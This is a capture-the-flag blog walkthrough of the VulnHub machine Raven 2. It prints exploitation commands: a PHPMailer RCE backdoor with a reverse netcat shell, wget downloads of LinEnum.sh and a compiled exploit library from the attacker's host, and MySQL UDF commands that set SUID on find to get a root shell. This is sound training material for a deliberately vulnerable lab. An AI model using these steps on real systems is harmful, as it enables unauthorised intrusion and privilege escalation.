<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Raven 2: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/raven-2-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-11-21T18:08:12+00:00">November 21, 2018</time><time class="updated" datetime="2025-06-10T20:14:39+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello everyone and welcome to yet another CTF challenge walkthrough. This time we’ll be putting our hands on Raven 2. It is the sequel to previously solved Raven. Raven 2 is a Beginner/Intermediate boot2root machine. The goal is to snag 4 flags and get the root on target VM.</span></p>
<h3><span style="color: #800000;"><strong>Table of Contents:</strong></span></h3>
<ol>
<li><span style="color: #000000;">Port scanning and IP discovery.</span></li>
<li><span style="color: #000000;">Hitting on port 80 and the discovery of WordPress CMS.</span></li>
<li><span style="color: #000000;">Directory enumeration to find a directory “vendor.”</span></li>
<li><span style="color: #000000;">Discovering a file PATH to snag flag 1.</span></li>
<li><span style="color: #000000;">Discovering a file VERSION to snag the PHP version.</span></li>
<li><span style="color: #000000;">Exploiting RCE in PHP version 5.2.6</span></li>
<li><span style="color: #000000;">Making local changes in the exploit code for the successful delivery of the payload.</span></li>
<li><span style="color: #000000;">Getting a netcat shell using the uploaded payload.</span></li>
<li><span style="color: #000000;">Snagging flag 2 in /var/www</span></li>
<li><span style="color: #000000;">Reading database password from the wp-config file.</span></li>
<li><span style="color: #000000;">Running LinEnum.sh to enumerate processes.</span></li>
<li><span style="color: #000000;">Exploiting UDF dynamic library vulnerability using an exploit with codename 1518.c on exploit-db</span></li>
<li><span style="color: #000000;">Setting sticky bit on the find.</span></li>
<li><span style="color: #000000;">Getting root access.</span></li>
<li><span style="color: #000000;">Snagging flag4 in /root</span></li>
<li><span style="color: #000000;">Manually traversing system to find flag3.</span></li>
</ol>
<p><span style="color: #000000;">Let’s get started then!</span></p>
<p><span style="color: #000000;">Discovering the active devices on a network using <strong>netdiscover</strong> and getting the IP address of our victim machine. In this case, the IP address holds 192.168.1.101</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dR06V1tynYU/W_WaFcS6oPI/AAAAAAAAbRk/Wx19zWkEnt04QsO8rWCPd8fbeyayXUdVACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Using nmap on the victim machine we got three ports open 22,80 and 111</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.101</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-V8UVagR8uU0/W_WaIcm9TBI/AAAAAAAAbSM/sMNDh9uaXl4luWsU73et_f9Ktr_hfMtZACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">So we instantly moved to port 80 and discovered a website of Raven Security.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Tt-BdwKvykE/W_WaIpQ9d4I/AAAAAAAAbSU/ypuN6oVpTEkB8mpOk_1xfke99glKMyQlQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We thought it would be wise to run a directory test before we scan anything else. So we ran a directory buster test to find the “vendor” directory in the victim machine.</span></p>
<pre class="lang:default decode:true ">dirb http://192.168.1.101/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-8k9woBBAyYQ/W_WaJH_pufI/AAAAAAAAbSY/x1krwKaxWLsghyQTITfTJPBp9ovaAaW8gCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Accessing /vendor the following files and folders came out.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-hXkW-FuqBQo/W_WaJc1wFbI/AAAAAAAAbSc/Ngh0lKGjo4kf-oJAAnq8MvchAD3AXRDZACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Among them, a file called PATH caught our attention since it is no ordinary name. So we opened it in the browser only to find flag1!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-onKVdqc7pAQ/W_WaJV6XkdI/AAAAAAAAbSg/FyeEqcPDg-UOKD8oPSsHjFzxOuqDoSW7ACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">There was yet another file worth noting called VERSION. On opening it we found the version of something. It was unclear which software had version 5.2.6 but look at the previous screen again… A file exists called: PHPMailerAutoload.php. It is fairly certain now that version 5.2.6 was of PHPMailer. So, on a bit of internet surfing, we found an RCE exploit for the version!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-X-XiLWsicHk/W_WaKLkrOhI/AAAAAAAAbSo/5n9DejIq-Xsl8kPccioq-100J7F5YEyyACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we downloaded this python file but don’t run it yet! There are some changes to be made which are highlighted in the screen below.</span></p>
<ol>
<li><span style="color: #000000;">A coding: utf-8 tag is to be added at the top.</span></li>
<li><span style="color: #000000;">Set the target of vulnerability to 192.168.1.101/contact.php where this vulnerability exists (read PHPMailer’s function).</span></li>
<li><span style="color: #000000;">Set the backdoor’s name. Let it be backdoor.php for now.</span></li>
<li><span style="color: #000000;">Set the local IP in the Subprocess call.</span></li>
<li><span style="color: #000000;">And finally, the location to upload the backdoor in.</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-25wK4o1Qjsw/W_WaKVLgYJI/AAAAAAAAbSs/kpqbxMnt9AYLb0JSZdOoCp6F3PBvtufZACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now run this python script and wait for the success message.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2Ko_RZq2Dik/W_WaKgFalhI/AAAAAAAAbSw/jO1-BpX_UZ4ukhrLh256zETJ6eVYUnXLACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Activate a netcat listener on port 443. It is because the backdoor gives a connection on port 443 as written in the python code (Subprocess call).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-uwcB7rdKmdM/W_WaFZWxSRI/AAAAAAAAbRo/C6vT82bt9HEseMbLxji1AY38RIFBwyazwCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Upon opening the location of backdoor we immediately got a shell!</span></p>
<p><span style="color: #000000;">Now we imported a proper teletype by using the python one-liner and manually traversed to /var/www only to discover flag2!</span></p>
<pre class="lang:default decode:true ">python –c 'import pty;pty.spawn("/bin/bash")'
cd /var/www
cat flag2.txt</pre>
<p><span style="color: #000000;">Now we thought of checking the WordPress directory as we did in the prequel Raven 1.</span></p>
<pre class="lang:default decode:true ">cd html
cd wordpress
cat wp-config.php</pre>
<p><span style="color: #000000;">We found the root database password! It was “R@v3nSecurity”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5rpSRAy5XG4/W_WaFslncsI/AAAAAAAAbRs/u8HyzWHe_AQMNnFxgRwpfv8NiUgTVh6FACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Then we changed the active directory to /tmp and imported <strong>LinEnum.sh, </strong>a script to enumerate many of the basic and advanced Linux details.</span></p>
<p><span style="color: #000000;">It was hosted in a folder on our local machine and was imported into the victim machine using <strong>wget</strong> command.</span></p>
<p><span style="color: #000000;">My local IP address was 192.168.1.109 in this case.</span></p>
<pre class="lang:default decode:true">cd /tmp
wget http://192.168.1.109/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-pXVrMx_fc6o/W_WaGS1Ju2I/AAAAAAAAbRw/SpHLPDymQcw9HXTpI8v4_bIhQk-VNauNQCLcBGAs/s1600/12.0.png"/></span></p>
<p><span style="color: #000000;">We found a <strong>MySQL-Exploit-Remote-Root-Code-Execution-Privesc </strong>vulnerability! (FOR MORE INFO: <a style="color: #000000;" href="https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html">https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html</a>)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OwP9eL0bV9c/W_WaGaP3XNI/AAAAAAAAbR0/9ku7kvqPbLwrQf5QWPPRs1fiITjjHWxCACLcBGAs/s1600/12.1.png"/></span></p>
<p><span style="color: #000000;">So, we searched for a UDF dynamic library exploit and it was named “1518.c” in the exploit database.</span></p>
<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.exploit-db.com/exploits/1518/">https://www.exploit-db.com/exploits/1518/</a></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bTeR1yY2foY/W_WaG8AvjaI/AAAAAAAAbR8/YGyJe4pUCCIFDcODzSig0G1rAY86BoQPgCLcBGAs/s1600/12.2.png"/></span></p>
<p><span style="color: #000000;">The exploits run by compiling the raw C code to “<strong>.so</strong>” file and then transferring it to the victim machine and exploiting MySQL vulnerability.</span></p>
<p><span style="color: #000000;">The first step was to compile it.</span></p>
<pre class="lang:default decode:true">searchsploit –m 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc</pre>
<p><img decoding="async" style="color: #000000;" src="https://4.bp.blogspot.com/-e9RCo4BCtvg/W_Wc_tHwyLI/AAAAAAAAbTU/Q25PGkyaorcZApZCNqKJZ8kyqHsBTrHOgCLcBGAs/s1600/12.png"/></p>
<p><span style="color: #000000;">And hence, we transferred this “<strong>.so</strong>” file in the<strong> /tmp</strong> directory in the victim’s machine.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.109/1518.so
chmod 777 1518.so</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uUuAFtT_0eQ/W_WaG16WGhI/AAAAAAAAbR4/JmGGNQ95Cl0iqOeTRX4n2PoH2JNr5catwCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now we logged in to the MySQL interface.</span></p>
<pre class="lang:default decode:true">mysql -u root -p</pre>
<p><span style="color: #000000;"><strong>&lt;entered password&gt;</strong></span></p>
<p><span style="color: #000000;">After getting a MySQL shell, we started exploiting it using the vulnerability we just found</span></p>
<pre class="lang:default decode:true">use mysql;</pre>
<p><span style="color: #000000;">Now, we created a table called “foo”</span></p>
<p><span style="color: #000000;">In this table, we inserted the link to 1518.so file we just imported from the local machine to /tmp directory.</span></p>
<p><span style="color: #000000;">We dumped the same file to /usr/lib/mysql/plugin/ directory (since it was vulnerable)</span></p>
<p><span style="color: #000000;">In the most important step, we created a UDF function named do_system, that will invoke the code that implements the function.</span></p>
<p><span style="color: #000000;">Hence, we are invoking the code “chmod u+s /usr/bin/find” to set the sticky bit on “find”</span></p>
<pre class="lang:default decode:true">create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
select do_system('chmod u+s /usr/bin/find');</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GJifURMruX0/W_WaHAgaUvI/AAAAAAAAbSA/vy176bESSfcJRgxRZP3ixXo1aK2AjN3ugCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now we traversed back to the directory /tmp and executed commands using the find utility.</span></p>
<pre class="lang:default decode:true">touch raj
find raj –exec "whoami" \;
find raj –exec "/bin/sh" \;
cd /root
ls
cat flag4.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5kCl2_Yebj8/W_WaHtPmg4I/AAAAAAAAbSE/-4JI4fq-xn4mxjp4zbMoelUXpZOcxHD8ACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">The only flag left to find was flag3.txt. You can do this with find utility but we had a bit of luck and found it manually!</span></p>
<p><span style="color: #000000;">It was lying in /var/www/html/wp-content/uploads/2018/11</span></p>
<p><span style="color: #000000;">We copied it in /var/www/html using cp.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IVAxE3YpCKA/W_WaH0xsJgI/AAAAAAAAbSI/ySwUhh8VtJoijujorCL0xUFs6tV63oOmwCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Since it was a png file we had to view it on the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LYC-_zBrJ3k/W_WaIVbLK0I/AAAAAAAAbSQ/aIbGTTgF-9QVBPIAOlOBWD5S9l_WVFcwwCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Hence, this is how we rooted Raven 2 and snagged all four flags! Hope you liked it!</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
